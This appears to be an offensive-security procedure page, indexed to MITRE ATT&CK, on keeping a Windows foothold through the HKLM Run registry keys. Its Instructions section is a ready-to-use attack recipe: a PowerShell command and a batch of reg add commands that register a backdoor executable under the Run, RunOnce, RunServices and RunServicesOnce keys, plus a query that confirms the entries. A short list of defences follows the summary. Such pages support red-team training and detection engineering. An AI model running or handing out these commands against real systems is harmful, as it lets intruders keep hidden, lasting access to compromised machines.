---
type: procedure
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Registry Run Keys / Startup Folder|T1060 - Registry Run Keys /
    Startup Folder]]
sub_techniques: []
tags:
  - '[[tags/Elevated]]'
  - '[[tags/Registry HKLM]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/powershell-new-itemproperty-hklm-run-key]]'
  - '[[commands/reg-add-to-hklm-run-key]]'
platforms:
  - Windows
tools: []
verified: true
validated: true
---

# Windows-Registry-HKLM-Run-Key-Persistence

## Summary

The Windows Registry HKLM Run Key Persistence procedure allows attackers to establish long-term access on a compromised Windows system by modifying the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. This ensures a specified executable, such as a backdoor, automatically launches with elevated privileges every time the system boots, surviving reboots and basic remediation efforts.

## Description

This technique targets the HKEY_LOCAL_MACHINE (HKLM) hive of the Windows Registry, specifically the Run key, which is a well-known autostart location executed during system initialization under the SYSTEM context. Attackers use this for persistence after initial access, often following privilege escalation, to maintain a foothold for further operations like data exfiltration or lateral movement. It requires administrative privileges, as HKLM modifications are protected. The procedure can be executed via PowerShell or the built-in reg.exe tool, with variations for additional autostart keys like RunOnce or RunServices for redundancy. Success is verified by querying the registry to confirm the new value's presence. This method is stealthy if the payload mimics legitimate software but can be detected through registry auditing or behavioral monitoring of startup processes.

## Requirements

1. Administrative (elevated) privileges on the target Windows system to modify HKLM.
2. The malicious executable (e.g., backdoor.exe) already staged on the system at a known path like C:\Windows\Temp\.
3. Access to an elevated PowerShell session or Command Prompt.
4. Windows operating system (tested on Windows 10/11 and Server editions).

## Defense

- Enforce principle of least privilege to restrict administrative access and use tools like AppLocker or Windows Defender Application Control for whitelisting.
- Enable registry auditing via Group Policy (Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration) to log changes to HKLM\Run.
- Deploy EDR solutions (e.g., Microsoft Defender for Endpoint) to monitor registry modifications, unusual startup entries, and process creation from svchost.exe or winlogon.exe.
- Regularly review startup programs using tools like Autoruns and implement software restriction policies.

## Objectives

1. Establish persistence by ensuring the backdoor executes automatically on every system boot with elevated privileges.
2. Maintain access post-reboot without requiring re-exploitation.
3. Provide a reliable mechanism for payload execution in the context of system startup processes.

## Instructions

### Step 1: Add Persistence Using PowerShell

**Context**: This step uses the New-ItemProperty cmdlet to create a new string value in the HKLM Run key, pointing to the backdoor executable. It provides a native PowerShell approach that's less likely to trigger basic command-line monitoring.

**Command** ([[commands/powershell-new-itemproperty-hklm-run-key]]):
```powershell
New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '$_VALUE_NAME' -Value '$_VALUE_DATA' -PropertyType String
```

> This cmdlet adds or updates the registry value. Run it in an elevated PowerShell prompt. If the value already exists, it will be overwritten. Expected output on success is the new registry property object displayed (e.g., Name: Backdoor, Value: C:\Windows\Temp\backdoor.exe); on failure, an AccessDenied exception if not elevated.

### Step 2: Verify the Registry Addition

**Context**: After adding the key, query the Run location to confirm the persistence entry was created successfully, ensuring the backdoor path is listed.

**Command** ([[commands/reg-query-hklm-run-key]]):
```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v $_VALUE_NAME
```

> This retrieves the specific value from the Run key. Expected output includes the value name, type (REG_SZ), and data (e.g., C:\Windows\Temp\backdoor.exe), confirming persistence is set.

### Step 3: Alternative Addition Using reg.exe for Multiple Keys

**Context**: For enhanced persistence across various autostart mechanisms (Run, RunOnce, RunServices, RunServicesOnce), execute a batch of reg.exe commands. This covers scenarios where one key might be cleaned, providing redundancy.

**Code** ([[codes/cmd-multiple-registry-persistence-adds]]):
```cmd
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

> Run these commands sequentially in an elevated Command Prompt. Each adds a value to a different autostart key. Expected output for each: "The operation completed successfully." Edit the value name (Evil) and data path before execution to match your payload.
